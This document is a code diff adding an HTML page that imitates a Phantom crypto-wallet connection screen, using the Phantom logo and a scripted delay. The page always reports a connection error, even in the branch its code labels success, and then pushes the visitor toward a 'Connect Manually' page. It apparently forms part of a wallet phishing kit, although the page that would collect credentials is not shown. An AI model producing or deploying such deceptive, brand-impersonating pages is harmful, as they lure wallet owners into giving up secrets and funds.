@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phantom Wallet Connection</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #F0F2F5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .wallet-card {
+            background-color: white;
+            padding: 2.5rem;
+            border-radius: 1rem;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            position: relative;
+            border-top: 5px solid #5A319B; 
+        }
+
+        .wallet-card img {
+            width: 80px;
+            height: 80px;
+            border-radius: 0.75rem;
+            margin-bottom: 1.5rem;
+            object-fit: contain;
+            display: block; 
+            margin-left: auto; 
+            margin-right: auto; 
+        }
+
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #5A319B;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1.5rem auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .message-box {
+            background-color: #EBF8FF;
+            color: #2B6CB0;
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid #90CDF4;
+            font-weight: 500;
+            display: none;
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+
+        .message-box.success {
+            background-color: white;
+            color: red; 
+            border-color: #A7F3D0;
+        }
+
+        .message-box.error {
+            background-color: #FFF5F5;
+            color: #C53030;
+            border-color: #FED7D7;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .back-button {
+            background-color: #5A319B;
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+
+        .back-button:hover {
+            background-color: rgb(234, 8, 234);
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="wallet-card">
+        <img src="https://play-lh.googleusercontent.com/obRvW02OTYLzJuvic1ZbVDVXLXzI0Vt_JGOjlxZ92XMdBF_i3kqU92u9SgHvJ5pySdM" alt="Phantom Wallet Logo">
+        <h1 class="text-2xl font-bold mb-4 text-gray-800">Connecting to Phantom Wallet...</h1>
+        <div class="spinner"></div>
+        <p id="connectionStatus" class="text-gray-600 mb-6">Please wait while we attempt to connect your wallet.</p>
+        <div id="messageBox" class="message-box"></div>
+        <a href="phantomwallet.html"> <button id="backButton" class="back-button" style="display: none;">Connect Manually</button></a>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const walletName = "Phantom Wallet"; 
+            
+            const connectionStatus = document.getElementById('connectionStatus');
+            const spinner = document.querySelector('.spinner');
+            const messageBox = document.getElementById('messageBox');
+            const backButton = document.getElementById('backButton');
+
+            setTimeout(() => {
+                const isSuccess = Math.random() < 0.8; 
+
+                spinner.style.display = 'none';
+
+                if (isSuccess) {
+                    connectionStatus.textContent = `Error connecting ${walletName}!`;
+                    messageBox.textContent = 'Try Connecting manually';
+                    messageBox.classList.add('success');
+                } else {
+                    connectionStatus.textContent = `Failed to connect to ${walletName}.`;
+                    messageBox.textContent = 'Try Connecting manually';
+                    messageBox.classList.add('error');
+                }
+                messageBox.style.display = 'block';
+                backButton.style.display = 'block';
+            }, 3000);
+
+            backButton.addEventListener('click', () => {
+                window.location.href = 'index.html';
+            });
+        });
+    </script>
+</body>
+</html>
